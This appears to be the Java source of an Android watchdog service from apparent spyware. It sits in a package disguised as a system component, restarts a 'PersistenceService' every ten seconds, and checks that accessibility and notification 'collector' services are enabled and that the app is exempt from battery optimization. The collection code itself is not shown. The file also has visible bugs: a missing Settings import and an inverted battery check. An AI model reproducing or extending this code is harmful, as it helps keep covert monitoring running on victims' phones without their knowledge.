package com.system.service.core;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.IBinder;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

public class WatchdogService extends Service {

    private static final long CHECK_INTERVAL = 10000; // 10 seconds
    private Handler handler;
    private Runnable watchdogTask;
    private SharedPreferences prefs;
    private boolean isRunning = false;

    public static void start(Context context) {
        Intent intent = new Intent(context, WatchdogService.class);
        context.startService(intent);
    }

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
        prefs = getSharedPreferences("sys_cfg", MODE_PRIVATE);
        isRunning = true;
        startWatchdog();
    }

    private void startWatchdog() {
        watchdogTask = new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    checkAndRestartServices();
                    handler.postDelayed(this, CHECK_INTERVAL);
                }
            }
        };
        handler.post(watchdogTask);
    }

    private void checkAndRestartServices() {
        // Check persistence service
        if (!isServiceRunning(PersistenceService.class)) {
            Log.w("Watchdog", "PersistenceService dead, restarting");
            PersistenceService.start(this);
        }

        // Check accessibility service enabled
        if (!isAccessibilityEnabled()) {
            Log.w("Watchdog", "Accessibility service disabled");
        }

        // Check notification listener enabled
        if (!isNotificationListenerEnabled()) {
            Log.w("Watchdog", "Notification listener disabled");
        }

        // Battery optimization check
        if (isBatteryOptimized()) {
            Log.w("Watchdog", "Battery optimization enabled for app");
        }
    }

    private boolean isServiceRunning(Class<?> serviceClass) {
        android.app.ActivityManager manager = (android.app.ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        if (manager != null) {
            for (android.app.ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
                if (serviceClass.getName().equals(service.service.getClassName())) {
                    return true;
                }
            }
        }
        return false;
    }

    private boolean isAccessibilityEnabled() {
        String setting = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        return setting != null && setting.contains("com.system.service.collection.AccessibilityCollector");
    }

    private boolean isNotificationListenerEnabled() {
        String setting = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        return setting != null && setting.contains("com.system.service.collection.NotificationCollector");
    }

    private boolean isBatteryOptimized() {
        android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
        return pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        handler.removeCallbacks(watchdogTask);
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}